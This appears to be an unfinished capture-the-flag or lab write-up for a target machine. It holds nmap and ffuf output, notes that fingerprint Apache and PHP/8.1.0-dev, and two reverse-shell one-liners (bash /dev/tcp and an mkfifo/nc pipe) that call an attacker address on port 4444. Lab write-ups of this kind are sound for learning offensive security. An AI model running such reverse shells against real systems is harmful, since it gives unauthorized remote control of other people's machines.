### Scanning
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-20 22:54 +0200
Nmap scan report for 10.129.48.99
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.71 seconds

```
### Fingerprinting
* Apache 2.4.41
* PHP
* PHP/8.1.0-dev

### Directories and Files
```
ffuf -u "http://$IP/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -e .php,.js,.html 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.48.99/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .php .js .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 23ms]
.hta.js                 [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 16ms]
.htaccess.html          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 16ms]
.htaccess.js            [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 19ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 20ms]
.hta.html               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 20ms]
.htpasswd.html          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 24ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 25ms]
.htpasswd.js            [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 25ms]
index.php               [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 27ms]
index.php               [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 22ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 28ms]
:: Progress: [19000/19000] :: Job [1/1] :: 1587 req/sec :: Duration: [0:00:12] :: Errors: 0 :
```

bash -i >& /dev/tcp/10.10.14.130/4444 0>&1

rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.130 4444 >/tmp/f